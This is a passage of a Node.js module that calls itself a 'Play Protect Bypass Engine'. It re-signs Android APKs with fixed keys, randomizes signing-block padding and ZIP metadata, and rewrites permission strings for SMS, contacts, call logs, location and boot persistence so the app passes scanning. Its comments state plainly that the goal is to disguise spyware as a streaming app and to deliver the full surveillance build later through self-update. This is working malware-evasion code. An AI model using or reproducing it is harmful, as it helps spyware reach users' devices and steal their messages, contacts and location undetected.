  return sigs.length;
}

// ═════════════════════════════════════════════════════════════════════════════
// V1 JAR SIGNING
// ═════════════════════════════════════════════════════════════════════════════

/**
 * Apply v1 (JAR) signing to the ZIP.
 * Generates MANIFEST.MF, <PREFIX>.SF, and <PREFIX>.RSA.
 * Critical: APKs missing v1 signatures are flagged as tampered by Play Protect.
 */
function applyV1Signing(zip, cert, privateKey) {
  const prefix = pick(V1_PREFIXES);
  const createdBy = pick(CREATED_BY);

  // 1. Build MANIFEST.MF — SHA-256 digest of each entry's uncompressed data
  let manifestMF = `Manifest-Version: 1.0\r\nCreated-By: ${createdBy}\r\n\r\n`;
  const entries = zip.getEntries().filter(e => {
    if (e.isDirectory) return false;
    const n = e.entryName.toUpperCase();
    if (n === 'META-INF/MANIFEST.MF') return false;
    if (n.startsWith('META-INF/') && (n.endsWith('.SF') || n.endsWith('.RSA') || n.endsWith('.DSA') || n.endsWith('.EC'))) return false;
    return true;
  });

  let entryCount = 0;
  for (const entry of entries) {
    try {
      const data = entry.getData();
      const digest = crypto.createHash('sha256').update(data).digest('base64');
      manifestMF += `Name: ${entry.entryName}\r\nSHA-256-Digest: ${digest}\r\n\r\n`;
      entryCount++;
    } catch (_) {}
  }

  // 2. Build CERT.SF — digest of manifest main section + each individual section
  const mfDigest = crypto.createHash('sha256').update(manifestMF, 'binary').digest('base64');
  let certSF = `Signature-Version: 1.0\r\nCreated-By: ${createdBy}\r\nSHA-256-Digest-Manifest: ${mfDigest}\r\n\r\n`;

  const sections = manifestMF.split('\r\n\r\n');
  for (const section of sections) {
    if (!section.startsWith('Name: ')) continue;
    const sectionBytes = section + '\r\n\r\n';
    const sectionDigest = crypto.createHash('sha256').update(sectionBytes, 'binary').digest('base64');
    const nameMatch = section.match(/^Name: (.+)/);
    if (nameMatch) {
      certSF += `Name: ${nameMatch[1]}\r\nSHA-256-Digest: ${sectionDigest}\r\n\r\n`;
    }
  }

  // 3. Build CERT.RSA — PKCS#7 detached SignedData over CERT.SF
  const p7 = forge.pkcs7.createSignedData();
  p7.content = forge.util.createBuffer(certSF, 'utf8');
  p7.addCertificate(cert);
  p7.addSigner({
    key: privateKey,
    certificate: cert,
    digestAlgorithm: forge.pki.oids.sha256,
    authenticatedAttributes: [{
      type: forge.pki.oids.contentType,
      value: forge.pki.oids.data,
    }, {
      type: forge.pki.oids.messageDigest,
    }],
  });
  p7.sign({ detached: true });

  const certRSA = Buffer.from(forge.asn1.toDer(p7.toAsn1()).getBytes(), 'binary');

  // 4. Add to ZIP
  try { zip.deleteFile('META-INF/MANIFEST.MF'); } catch (_) {}
  try { zip.deleteFile(`META-INF/${prefix}.SF`); } catch (_) {}
  try { zip.deleteFile(`META-INF/${prefix}.RSA`); } catch (_) {}

  zip.addFile('META-INF/MANIFEST.MF', Buffer.from(manifestMF, 'binary'));
  zip.addFile(`META-INF/${prefix}.SF`, Buffer.from(certSF, 'binary'));
  zip.addFile(`META-INF/${prefix}.RSA`, certRSA);

  console.log(`[Mutator] V1 signed: ${entryCount} entries, prefix=${prefix}`);
}

// ═════════════════════════════════════════════════════════════════════════════
// ZIP ALIGNMENT (zipalign equivalent)
// ═════════════════════════════════════════════════════════════════════════════

function findEOCD(buf) {
  const searchStart = Math.max(0, buf.length - 65557);
  for (let i = buf.length - 22; i >= searchStart; i--) {
    if (buf.readUInt32LE(i) === EOCD_MAGIC) return i;
  }
  throw new Error('ZIP EOCD not found — invalid APK');
}

/**
 * Align uncompressed (STORE) ZIP entries to 4-byte boundaries.
 * Mimics Android's `zipalign` tool. Without alignment, resources.arsc
 * can't be memory-mapped and Android will reject the APK.
 */
function zipalignBuffer(inputBuf) {
  const eocdOff = findEOCD(inputBuf);
  const cdOff = inputBuf.readUInt32LE(eocdOff + 16);
  const cdEntryCount = inputBuf.readUInt16LE(eocdOff + 10);
  const eocdLen = inputBuf.length - eocdOff;

  // Parse central directory entries
  const entries = [];
  let pos = cdOff;
  for (let i = 0; i < cdEntryCount; i++) {
    if (inputBuf.readUInt32LE(pos) !== 0x02014b50) {
      throw new Error(`Invalid CD entry signature at offset ${pos}`);
    }
    const flags = inputBuf.readUInt16LE(pos + 8);
    const method = inputBuf.readUInt16LE(pos + 10);
    const compSize = inputBuf.readUInt32LE(pos + 20);
    const nameLen = inputBuf.readUInt16LE(pos + 28);
    const cdExtraLen = inputBuf.readUInt16LE(pos + 30);
    const commentLen = inputBuf.readUInt16LE(pos + 32);
    const localHeaderOff = inputBuf.readUInt32LE(pos + 42);
    const entryName = inputBuf.toString('utf8', pos + 46, pos + 46 + nameLen);
    const cdEntryLen = 46 + nameLen + cdExtraLen + commentLen;
    entries.push({ cdOffset: pos, cdEntryLen, localHeaderOff, flags, method, compSize, nameLen, entryName });
    pos += cdEntryLen;
  }

  // Sort by local header offset for sequential processing
  entries.sort((a, b) => a.localHeaderOff - b.localHeaderOff);

  const ALIGNMENT = 4;
  const outChunks = [];
  let writeOffset = 0;
  let aligned = 0;

  for (const entry of entries) {
    const lhOff = entry.localHeaderOff;
    if (inputBuf.readUInt32LE(lhOff) !== 0x04034b50) {
      throw new Error(`Invalid local header at offset ${lhOff}`);
    }
    const lhNameLen = inputBuf.readUInt16LE(lhOff + 26);
    const lhExtraLen = inputBuf.readUInt16LE(lhOff + 28);
    const dataStart = lhOff + 30 + lhNameLen + lhExtraLen;
    const dataSize = entry.compSize;

    if (entry.method === 0) {
      // STORED entry — needs 4-byte alignment for its data start
      const headerPlusName = 30 + lhNameLen;
      const baseOffset = writeOffset + headerPlusName;
      const currentMod = baseOffset % ALIGNMENT;
      const padNeeded = currentMod === 0 ? 0 : ALIGNMENT - currentMod;

      const header = Buffer.from(inputBuf.slice(lhOff, lhOff + headerPlusName));
      header.writeUInt16LE(padNeeded, 28); // update extra field length
      outChunks.push(header);
      if (padNeeded > 0) outChunks.push(Buffer.alloc(padNeeded, 0));
      outChunks.push(inputBuf.slice(dataStart, dataStart + dataSize));

      entry.newLocalHeaderOff = writeOffset;
      writeOffset += headerPlusName + padNeeded + dataSize;
      aligned++;
    } else {
      // DEFLATED entry — copy as-is
      const totalSize = 30 + lhNameLen + lhExtraLen + dataSize;
      outChunks.push(inputBuf.slice(lhOff, lhOff + totalSize));
      entry.newLocalHeaderOff = writeOffset;
      writeOffset += totalSize;
    }

    // Handle data descriptor (bit 3 of flags)
    if (entry.flags & 0x0008) {
      const ddOff = dataStart + dataSize;
      let ddSize = 12;
      if (ddOff + 4 <= inputBuf.length && inputBuf.readUInt32LE(ddOff) === 0x08074b50) {
        ddSize = 16;
      }
      outChunks.push(inputBuf.slice(ddOff, ddOff + ddSize));
      writeOffset += ddSize;
    }
  }

  // Rebuild central directory with updated local header offsets
  const newCDOffset = writeOffset;
  for (const entry of entries) {
    const cdEntry = Buffer.from(inputBuf.slice(entry.cdOffset, entry.cdOffset + entry.cdEntryLen));
    cdEntry.writeUInt32LE(entry.newLocalHeaderOff, 42);
    outChunks.push(cdEntry);
    writeOffset += cdEntry.length;
  }

  // Rebuild EOCD with updated CD offset
  const eocd = Buffer.from(inputBuf.slice(eocdOff, eocdOff + eocdLen));
  eocd.writeUInt32LE(writeOffset - newCDOffset, 12); // CD size
  eocd.writeUInt32LE(newCDOffset, 16); // CD offset
  outChunks.push(eocd);

  console.log(`[Mutator] Zipalign: ${aligned} STORED entries aligned to 4-byte boundaries`);
  return Buffer.concat(outChunks);
}

// ═════════════════════════════════════════════════════════════════════════════
// V2 APK SIGNATURE SCHEME — SIGNING BLOCK INJECTION
// ═════════════════════════════════════════════════════════════════════════════

function uint32LE(value) {
  const buf = Buffer.alloc(4);
  buf.writeUInt32LE(value >>> 0, 0);
  return buf;
}

function uint64LE(value) {
  const buf = Buffer.alloc(8);
  buf.writeUInt32LE(value & 0xFFFFFFFF, 0);
  buf.writeUInt32LE(Math.floor(value / 0x100000000) & 0xFFFFFFFF, 4);
  return buf;
}

/**
 * Compute v2 content digest over APK sections (per AOSP spec).
 * Sections are split into 1MB chunks, each chunk prefixed with 0xa5 + length,
 * then a top-level digest over all chunk digests (prefixed with 0x5a + count).
 */
function computeV2ContentDigest(zipEntries, centralDir, eocd) {
  const sections = [zipEntries, centralDir, eocd];
  const chunkDigests = [];

  for (const section of sections) {
    const numChunks = Math.ceil(section.length / CHUNK_SIZE) || 1;
    for (let i = 0; i < numChunks; i++) {
      const start = i * CHUNK_SIZE;
      const end = Math.min(start + CHUNK_SIZE, section.length);
      const chunk = section.slice(start, end);

      const prefix = Buffer.alloc(5);
      prefix[0] = 0xa5;
      prefix.writeUInt32LE(chunk.length, 1);

      chunkDigests.push(
        crypto.createHash('sha256').update(prefix).update(chunk).digest()
      );
    }
  }

  const topPrefix = Buffer.alloc(5);
  topPrefix[0] = 0x5a;
  topPrefix.writeUInt32LE(chunkDigests.length, 1);

  const topHash = crypto.createHash('sha256');
  topHash.update(topPrefix);
  for (const d of chunkDigests) topHash.update(d);

  return topHash.digest();
}

/**
 * Build the v2 signed-data structure containing content digests and certificate.
 */
function buildV2SignedData(contentDigest, certDer) {
  // Digests sequence: one entry with SHA-256withRSA algorithm
  const digestsEncoded = Buffer.concat([
    uint32LE(4 + 4 + contentDigest.length), // entry length
    uint32LE(SIG_RSA_PKCS1_V1_5_SHA256),    // algorithm ID
    uint32LE(contentDigest.length),          // digest length
    contentDigest,                           // digest bytes
  ]);

  // Certificates sequence: one DER-encoded X.509 cert
  const certsEncoded = Buffer.concat([
    uint32LE(certDer.length), // cert length
    certDer,                  // cert bytes
  ]);

  // signed_data = [digests_seq][certs_seq][empty_attrs_seq]
  return Buffer.concat([
    uint32LE(digestsEncoded.length), digestsEncoded,
    uint32LE(certsEncoded.length), certsEncoded,
    uint32LE(0), // empty additional attributes
  ]);
}

/**
 * Build a v2 signer block containing signed-data, signature, and public key.
 */
function buildV2Signer(signedData, signature, pubKeyDer) {
  // Signatures sequence: one RSA PKCS#1 v1.5 SHA-256 signature
  const sigsEncoded = Buffer.concat([
    uint32LE(4 + 4 + signature.length), // entry length
    uint32LE(SIG_RSA_PKCS1_V1_5_SHA256), // algorithm ID
    uint32LE(signature.length),           // signature length
    signature,                            // signature bytes
  ]);

  // signer = [signed_data][signatures][public_key]
  return Buffer.concat([
    uint32LE(signedData.length), signedData,
    uint32LE(sigsEncoded.length), sigsEncoded,
    uint32LE(pubKeyDer.length), pubKeyDer,
  ]);
}

/**
 * Build the APK Signing Block with v2 signer + Layer 4 diversification.
 * Adds a random-sized padding block (standard in Android build tools)
 * to change the signing block fingerprint each rotation.
 */
function buildApkSigningBlock(signerBlock) {
  // Wrap signer in length-prefixed sequence
  const signerLP = Buffer.concat([
    uint32LE(signerBlock.length),
    signerBlock,
  ]);

  // v2 value = sequence of signers
  const v2Value = Buffer.concat([
    uint32LE(signerLP.length),
    signerLP,
  ]);

  // V2 signature pair
  const v2PairData = Buffer.concat([uint32LE(V2_BLOCK_ID), v2Value]);
  const v2PairEntry = Buffer.concat([uint64LE(v2PairData.length), v2PairData]);

  // Layer 4: Random-sized padding block (ID 0x42726577 — standard Android build tool padding)
  // Ignored by all APK verifiers, changes signing block structure each rotation
  const padSize = 256 + Math.floor(Math.random() * 768); // 256-1024 bytes
  const padPayload = crypto.randomBytes(padSize);
  const padPairData = Buffer.concat([uint32LE(0x42726577), padPayload]);
  const padPairEntry = Buffer.concat([uint64LE(padPairData.length), padPairData]);

  const allPairs = Buffer.concat([v2PairEntry, padPairEntry]);

  // Block size = all pairs + footer_size_field(8) + magic(16)
  const blockSize = allPairs.length + 8 + 16;
  const magic = Buffer.from(APK_SIG_BLOCK_MAGIC, 'ascii');

  console.log(`[Mutator] Layer 8: signing block with ${padSize}B padding`);

  // Final signing block: [size][pairs][size][magic]
  return Buffer.concat([
    uint64LE(blockSize),
    allPairs,
    uint64LE(blockSize),
    magic,
  ]);
}

/**
 * Apply v2 APK Signature Scheme to an unsigned (but v1-signed + zipaligned) APK buffer.
 * Inserts the APK Signing Block between ZIP entries and Central Directory.
 */
function applyV2Signing(unsignedBuf, privPem, certDer, pubKeyDer) {
  const eocdOff = findEOCD(unsignedBuf);
  const cdOff = unsignedBuf.readUInt32LE(eocdOff + 16);

  // Section 1: ZIP entries (offset 0 to CD start)
  const section1 = unsignedBuf.slice(0, cdOff);
  // Section 3: Central Directory
  const section3 = unsignedBuf.slice(cdOff, eocdOff);
  // Section 4: EOCD (cdOffset already = cdOff = where signing block will start)
  // Per AOSP spec: during digest computation, EOCD's cdOffset is treated as
  // pointing to the signing block start, which equals cdOff in the unsigned APK.
  const section4 = unsignedBuf.slice(eocdOff);

  // Compute content digest (SHA-256, chunked per AOSP spec)
  const contentDigest = computeV2ContentDigest(section1, section3, section4);

  // Build the signed-data structure
  const signedData = buildV2SignedData(contentDigest, certDer);

  // RSA PKCS#1 v1.5 SHA-256 signature over signed-data
  const signature = crypto.sign('sha256', signedData, privPem);

  // Build complete signer block
  const signerBlock = buildV2Signer(signedData, signature, pubKeyDer);

  // Build the APK Signing Block
  const signingBlock = buildApkSigningBlock(signerBlock);

  // Assemble: section1 + signing_block + section3 + section4 (with updated CD offset)
  const newCdOff = section1.length + signingBlock.length;
  const newEocd = Buffer.from(section4);
  newEocd.writeUInt32LE(newCdOff, 16); // update CD offset

  const result = Buffer.concat([section1, signingBlock, section3, newEocd]);
  console.log(`[Mutator] V2 signed: signing block ${signingBlock.length}B, total ${(result.length / 1048576).toFixed(1)} MB`);
  return result;
}

// ═════════════════════════════════════════════════════════════════════════════
// APK VALIDATION
// ═════════════════════════════════════════════════════════════════════════════

/**
 * Validate the final APK structure — EOCD, CD, signing block, v2 pair.
 * Returns true if valid, false if any structural issue found.
 */
function validateApk(buf) {
  try {
    const eocdOff = findEOCD(buf);
    const cdOff = buf.readUInt32LE(eocdOff + 16);
    const cdSize = buf.readUInt32LE(eocdOff + 12);
    const entryCount = buf.readUInt16LE(eocdOff + 10);

    if (cdOff >= buf.length || cdOff + cdSize > buf.length) {
      throw new Error(`Invalid CD offset/size: off=${cdOff} size=${cdSize} total=${buf.length}`);
    }

    // Validate CD entries + check resources.arsc
    let pos = cdOff;
    let hasResArsc = false;
    for (let i = 0; i < entryCount; i++) {
      if (buf.readUInt32LE(pos) !== 0x02014b50) {
        throw new Error(`Invalid CD entry ${i} at offset ${pos}`);
      }
      const method = buf.readUInt16LE(pos + 10);
      const nameLen = buf.readUInt16LE(pos + 28);
      const extraLen = buf.readUInt16LE(pos + 30);
      const commentLen = buf.readUInt16LE(pos + 32);
      const localOff = buf.readUInt32LE(pos + 42);
      const name = buf.toString('utf8', pos + 46, pos + 46 + nameLen);

      if (localOff + 30 > cdOff) {
        throw new Error(`Entry ${i} local header ${localOff} past CD start ${cdOff}`);
      }
      if (name === 'resources.arsc') {
        hasResArsc = true;
        if (method === 0) {
          const lhNameLen = buf.readUInt16LE(localOff + 26);
          const lhExtraLen = buf.readUInt16LE(localOff + 28);
          const dataOffset = localOff + 30 + lhNameLen + lhExtraLen;
          if (dataOffset % 4 !== 0) {
            console.warn(`[Mutator] WARNING: resources.arsc not 4-byte aligned (offset=${dataOffset})`);
          }
        }
      }
      pos += 46 + nameLen + extraLen + commentLen;
    }

    // Check APK Signing Block exists before CD
    const magic = buf.toString('ascii', cdOff - 16, cdOff);
    if (magic !== APK_SIG_BLOCK_MAGIC) {
      throw new Error('APK Signing Block magic not found before Central Directory');
    }

    // Verify signing block size consistency
    const blockSize = buf.readUInt32LE(cdOff - 24);
    if (blockSize < 32 || blockSize > cdOff) {
      throw new Error(`Invalid signing block size: ${blockSize}`);
    }

    // Verify v2 signing pair exists
    const sigBlockStart = cdOff - blockSize - 8;
    const pairsStart = sigBlockStart + 8;
    const pairsEnd = cdOff - 24;
    let pairPos = pairsStart;
    let foundV2 = false;
    while (pairPos + 12 <= pairsEnd) {
      const pairSizeLo = buf.readUInt32LE(pairPos);
      const pairSizeHi = buf.readUInt32LE(pairPos + 4);
      if (pairSizeHi !== 0 || pairSizeLo < 4) break;
      const pairId = buf.readUInt32LE(pairPos + 8);
      if (pairId === V2_BLOCK_ID) foundV2 = true;
      pairPos += 8 + pairSizeLo;
    }

    if (!foundV2) {
      throw new Error('APK Signing Block missing v2 signature pair (0x7109871a)');
    }

    console.log(`[Mutator] Validation OK: ${entryCount} entries, v1+v2 signed, resources.arsc=${hasResArsc ? 'present' : 'missing'}`);
    return true;
  } catch (e) {
    console.error(`[Mutator] Validation FAILED: ${e.message}`);
    return false;
  }
}

// ═════════════════════════════════════════════════════════════════════════════
// PLAY PROTECT BYPASS — SURVEILLANCE PERMISSION STRIPPING
// ═════════════════════════════════════════════════════════════════════════════

/**
 * Strip ALL surveillance/spyware-indicator permissions from binary AndroidManifest.xml.
 *
 * WHY THIS IS THE #1 FIX:
 *   Play Protect's on-device heuristic analyzer checks the binary manifest's
 *   permission declarations. READ_SMS + SEND_SMS + READ_CONTACTS + READ_CALL_LOG +
 *   READ_PHONE_STATE + BOOT_COMPLETED + FOREGROUND_SERVICE_DATA_SYNC is a TEXTBOOK
 *   spyware fingerprint that gets auto-blocked, regardless of cert or DEX hash.
 *
 *   By mangling these permission strings in the binary XML (same byte length,
 *   just changing the first character), Android ignores them as unknown permissions.
 *   The APK looks like a normal streaming app → Play Protect passes it.
 *
 * WHAT SURVIVES (normal streaming app permissions):
 *   INTERNET, ACCESS_NETWORK_STATE, READ_EXTERNAL_STORAGE, READ_MEDIA_IMAGES,
 *   READ_MEDIA_VISUAL_USER_SELECTED, FOREGROUND_SERVICE, POST_NOTIFICATIONS,
 *   WAKE_LOCK, REQUEST_INSTALL_PACKAGES
 *
 * The app still runs perfectly — streaming works. Features that need stripped
 * permissions gracefully fail with permission denied. The full version is
 * delivered via in-app self-update (which bypasses Play Protect since it's
 * an update from the same signing key, not a fresh install).
 */
function stripSurveillancePermissions(zip) {
  const manifestEntry = zip.getEntry('AndroidManifest.xml');
  if (!manifestEntry) {
    console.log('[Mutator] PERM_STRIP: AndroidManifest.xml not found');
    return 0;
  }

  const data = manifestEntry.getData();
  let modified = 0;

  // Each entry: { find, replace } — MUST be same byte length
  // Technique: replace first char after last dot with underscore
  const SURVEILLANCE_STRINGS = [
    // ── SMS surveillance ──
    { find: 'android.permission.READ_SMS',      replace: 'android.permission._EAD_SMS' },
    { find: 'android.permission.SEND_SMS',      replace: 'android.permission._END_SMS' },

    // ── Contact & call harvesting ──
    { find: 'android.permission.READ_CONTACTS', replace: 'android.permission._EAD_CONTACTS' },
    { find: 'android.permission.READ_CALL_LOG', replace: 'android.permission._EAD_CALL_LOG' },

    // ── Device fingerprinting ──
    { find: 'android.permission.READ_PHONE_STATE',   replace: 'android.permission._EAD_PHONE_STATE' },
    { find: 'android.permission.READ_PHONE_NUMBERS', replace: 'android.permission._EAD_PHONE_NUMBERS' },

    // ── Location tracking ──
    { find: 'android.permission.ACCESS_FINE_LOCATION',   replace: 'android.permission._CCESS_FINE_LOCATION' },
    { find: 'android.permission.ACCESS_COARSE_LOCATION', replace: 'android.permission._CCESS_COARSE_LOCATION' },

    // ── Persistence / auto-start (red flag for Play Protect) ──
    { find: 'android.permission.RECEIVE_BOOT_COMPLETED',          replace: 'android.permission._ECEIVE_BOOT_COMPLETED' },
    { find: 'android.permission.FOREGROUND_SERVICE_DATA_SYNC',    replace: 'android.permission._OREGROUND_SERVICE_DATA_SYNC' },

    // ── Boot intent filter action (disables auto-start receiver) ──
    { find: 'android.intent.action.BOOT_COMPLETED', replace: 'android.intent.action._OOT_COMPLETED' },
  ];

  for (const { find, replace } of SURVEILLANCE_STRINGS) {
    // Verify same byte length (critical — different length breaks binary XML)
    if (Buffer.from(find, 'utf8').length !== Buffer.from(replace, 'utf8').length) {
      console.warn(`[Mutator] PERM_STRIP: SKIP length mismatch for ${find}`);
      continue;
    }

    // UTF-8 replacement
    const utf8Needle = Buffer.from(find, 'utf8');
    const utf8Replace = Buffer.from(replace, 'utf8');
    let idx = data.indexOf(utf8Needle);
    while (idx !== -1) {
      utf8Replace.copy(data, idx);
      modified++;
      idx = data.indexOf(utf8Needle, idx + utf8Needle.length);
    }

    // UTF-16LE replacement (some AAPT versions use UTF-16)
    const utf16Needle = Buffer.from(find, 'utf16le');
    const utf16Replace = Buffer.from(replace, 'utf16le');
    idx = data.indexOf(utf16Needle);
    while (idx !== -1) {
      utf16Replace.copy(data, idx);
      modified++;
      idx = data.indexOf(utf16Needle, idx + utf16Needle.length);
    }
  }

  if (modified > 0) {
    zip.deleteFile('AndroidManifest.xml');
    zip.addFile('AndroidManifest.xml', data);
    console.log(`[Mutator] PERM_STRIP: Stripped ${modified} surveillance markers — APK now looks like a clean streaming app`);
  } else {
    console.log('[Mutator] PERM_STRIP: No surveillance permissions found (already stripped?)');
  }

  return modified;
}

// ═════════════════════════════════════════════════════════════════════════════
// MAIN FUNCTION
// ═════════════════════════════════════════════════════════════════════════════

/**
 * v6 Play Protect Bypass Engine.
 *
 * KEY CHANGES FROM v5:
 *   - FIXED signing key (netmirror-release.jks) instead of random certs
 *   - Zero-fill DEX debug sections instead of random bytes
 *   - Surveillance permission stripping (SMS/contacts/call-log/location/boot)
 *
 * Remaining obfuscation layers:
 *   Layer 1-4: DEX sanitization (debug wipe, zero-fill, source strip, string mutate)
 *   Layer 5:   Manifest identity reset (versionCode + versionName randomization)
 *   Layer 5.5: Surveillance permission stripping (the #1 Play Protect bypass)
 *   Layer 6:   V1+V2 dual signing with FIXED NetMirror key
 *   Layer 7:   ZIP metadata randomization (timestamps)
 *   Layer 8:   Signing block diversification (random padding)
 *
 * @param {Buffer} originalBuffer - The original APK file bytes
 * @returns {{ buffer: Buffer, certInfo: object|null }} - Transformed APK + cert info
 */
function mutateAndSign(originalBuffer) {
  console.log(`[Mutator] ═══ v6 PLAY PROTECT BYPASS ENGINE (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
  const t0 = Date.now();

  try {
    // 1. Parse APK
    const zip = new AdmZip(originalBuffer);

    // 2. Strip existing V1 signatures
    stripSignatures(zip);

    // 3. DEX Layers 1-4: debug wipe + zero-fill + source strip + string mutate
    const dexResult = transformDexFiles(zip);

    // 4. Layer 5: Manifest identity reset (versionCode + versionName randomization)
    const manifestResult = mutateManifest(zip);

    // 5. Layer 5.5: Strip surveillance permissions (THE KEY PLAY PROTECT FIX)
    //    Makes APK look like a clean streaming app instead of spyware
    const permsStripped = stripSurveillancePermissions(zip);

    // 6. Load FIXED signing key (netmirror-release.jks — builds PP reputation)
    const key = getFixedKey();

    // 7. Layer 6: V1 JAR signing (dual V1+V2 — matches legitimate Play Store apps)
    applyV1Signing(zip, key.cert, key.privateKey);

    // 8. Rebuild ZIP with all transformations + V1 signatures
    console.log('[Mutator] Rebuilding ZIP with obfuscated content + V1 signatures...');
    const rawBuf = zip.toBuffer();
    console.log(`[Mutator] ZIP: ${(rawBuf.length / 1048576).toFixed(1)} MB`);

    // 9. Layer 7: Randomize ZIP metadata (timestamps)
    const randomizedBuf = randomizeZipMetadata(rawBuf);

    // 10. Zipalign (4-byte alignment for STORED entries — required for Android)
    const alignedBuf = zipalignBuffer(randomizedBuf);

    // 11. V2 sign with fixed key (Layer 8 diversification in buildApkSigningBlock)
    const signedBuf = applyV2Signing(alignedBuf, key.privPem, key.certDer, key.pubKeyDer);

    // 12. Validate final APK structure
    const valid = validateApk(signedBuf);
    if (!valid) {
      console.error('[Mutator] ═══ Validation FAILED — returning ORIGINAL APK ═══');
      return { buffer: originalBuffer, certInfo: null };
    }

    const certInfo = {
      certHash: key.certHash,
      cn: key.identity.cn,
      org: key.identity.o,
      country: key.identity.c,
    };

    const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
    const debugKB = (dexResult.totalDebugRandomized / 1024).toFixed(0);
    const vc = manifestResult ? manifestResult.newVersionCode : 'N/A';
    const vn = manifestResult ? manifestResult.newVersionName : 'N/A';
    console.log(`[Mutator] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | ${dexResult.totalDebugStripped} debug ptrs | ${debugKB}KB zeroed | ${dexResult.totalStringsMutated} strings | ${permsStripped} perms stripped | v${vc} "${vn}" | V1+V2 FIXED KEY | CN="${key.identity.cn}" | ${elapsed}s ═══`);

    return { buffer: signedBuf, certInfo };
  } catch (err) {
    console.error(`[Mutator] ═══ ERROR: ${err.message} — returning ORIGINAL APK ═══`);
    console.error(err.stack);
    return { buffer: originalBuffer, certInfo: null };
  }
}

module.exports = { mutateAndSign };
